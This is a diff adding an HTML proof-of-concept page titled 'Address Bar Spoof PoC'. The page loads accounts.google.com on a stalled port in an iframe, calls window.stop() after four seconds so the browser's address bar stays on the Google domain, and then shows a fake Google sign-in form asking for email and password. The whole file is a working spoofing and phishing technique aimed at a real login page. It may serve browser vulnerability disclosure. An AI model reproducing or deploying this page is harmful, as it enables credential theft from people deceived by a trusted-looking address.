@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Address Bar Spoof PoC</title>
+<style>
+    body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+    }
+    iframe {
+        width: 100vw;
+        height: 100vh;
+        border: none;
+    }
+    #fake-ui {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100vw; height: 100vh;
+        background: #fff;
+        display: none;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+    }
+    input {
+        padding: 10px;
+        margin: 10px;
+        width: 250px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+    }
+</style>
+</head>
+<body>
+
+<!-- Step 1: Load the hanging Google port -->
+<iframe id="loader" src="https://accounts.google.com:4444/"></iframe>
+
+<!-- Step 2: Fake Google Login UI -->
+<div id="fake-ui">
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" width="180">
+    <h2>Sign in</h2>
+    <input type="email" placeholder="Email or phone">
+    <input type="password" placeholder="Enter your password">
+</div>
+
+<script>
+    // Step 3: Wait 4 seconds so the address bar gets updated
+    setTimeout(() => {
+        window.stop(); // freezes address bar on valid Google domain
+        document.getElementById("fake-ui").style.display = "flex";
+    }, 4000);
+</script>
+
+</body>
+</html>
